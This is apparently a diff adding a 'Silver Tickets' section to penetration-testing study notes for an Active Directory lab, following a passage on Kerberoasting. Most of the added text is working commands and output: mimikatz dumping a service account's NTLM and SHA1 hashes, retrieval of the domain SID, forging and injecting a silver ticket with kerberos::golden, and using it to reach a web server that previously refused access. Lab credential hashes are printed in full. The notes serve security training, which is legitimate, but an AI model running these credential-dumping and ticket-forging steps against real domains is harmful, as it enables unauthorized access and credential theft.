@@ -306,3 +306,160 @@ If impacket-GetUserSPNs throws the error "KRB\_AP\_ERR\_SKEW(Clock skew too grea
 This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.
 
 Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions7 on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user,8 kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. We'll note that in an assessment, we should delete the SPN once we've obtained the hash to avoid adding any potential vulnerabilities to the client's infrastructure.
+
+## Silver Tickets
+
+In general, we need to collect the following three pieces of information to create a silver ticket:
+
+```
+SPN password hash
+Domain SID
+Target SPN
+```
+
+First, let's confirm that our current user has no access to the resource of the HTTP SPN mapped to iis\_service. To do so, we'll use iwr4 and enter -UseDefaultCredentials so that the credentials of the current user are used to send the web request.
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
+iwr :
+401 - Unauthorized: Access is denied due to invalid credentials.
+Server Error
+
+  401 - Unauthorized: Access is denied due to invalid credentials.
+  You do not have permission to view this directory or page using the credentials that you supplied.
+
+At line:1 char:1
++ iwr -UseBasicParsing -UseDefaultCredentials http://web04
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
+   eption
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand/
+
+```
+{% endcode %}
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1147751 (00000000:00118367)
+Session           : Service from 0
+User Name         : iis_service
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/14/2022 4:52:14 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1109
+        msv :
+         [00000003] Primary
+         * Username : iis_service
+         * Domain   : CORP
+         * NTLM     : 4d28cf5252d39971419580a51484ca09
+         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
+         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
+...
+
+```
+
+```
+PS C:\Users\jeff> whoami /user
+
+USER INFORMATION
+----------------
+
+User Name SID
+========= =============================================
+corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
+```
+
+We need to provide the domain SID (/sid:), domain name (/domain:), and the target where the SPN runs (/target:). We also need to include the SPN protocol (/service:), NTLM hash of the SPN (/rc4:), and the /ptt option, which allows us to inject the forged ticket into the memory of the machine we execute the command on.
+
+Finally, we must enter an existing domain user for /user:. This user will be set in the forged ticket. For this example, we'll use jeffadmin. However, we could also use any other domain user since we can set the permissions and groups ourselves.
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+User      : jeffadmin
+Domain    : corp.com (CORP)
+SID       : S-1-5-21-1987370270-658905905-1781884369
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
+Service   : http
+Target    : web04.corp.com
+Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
+
+mimikatz # exit
+Bye!
+```
+{% endcode %}
+
+This means we should have the ticket ready to use in memory. We can confirm this with klist.
+
+```
+PS C:\Tools> klist
+
+Current LogonId is 0:0xa04cc
+
+Cached Tickets: (1)
+
+#0>     Client: jeffadmin @ corp.com
+        Server: http/web04.corp.com @ corp.com
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+        Start Time: 9/14/2022 4:37:32 (local)
+        End Time:   9/11/2032 4:37:32 (local)
+        Renew Time: 9/11/2032 4:37:32 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+```
+
+{% code title=" Accessing the SMB share with the silver ticket" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Tools> iwr -UseDefaultCredentials http://web04
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+                    <html xmlns="http://www.w3.org/1999/xhtml">
+                    <head>
+                    <meta http-equiv="Content-Type" cont...
+RawContent        : HTTP/1.1 200 OK
+                    Persistent-Auth: true
+                    Accept-Ranges: bytes
+                    Content-Length: 703
+                    Content-Type: text/html
+                    Date: Wed, 14 Sep 2022 11:37:39 GMT
+                    ETag: "b752f823fc8d81:0"
+                    Last-Modified: Wed, 14 Sep 20...
+Forms             :
+Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
+                    text/html]...}
+Images            : {}
+InputFields       : {}
+Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
+                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
+                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
+ParsedHtml        :
+RawContentLength  : 703
+```
+{% endcode %}
+
+{% code title="to download the file" overflow="wrap" lineNumbers="true" %}
+```
+iwr -UseDefaultCredentials http://web04 -Outfile file.html
+```
+{% endcode %}
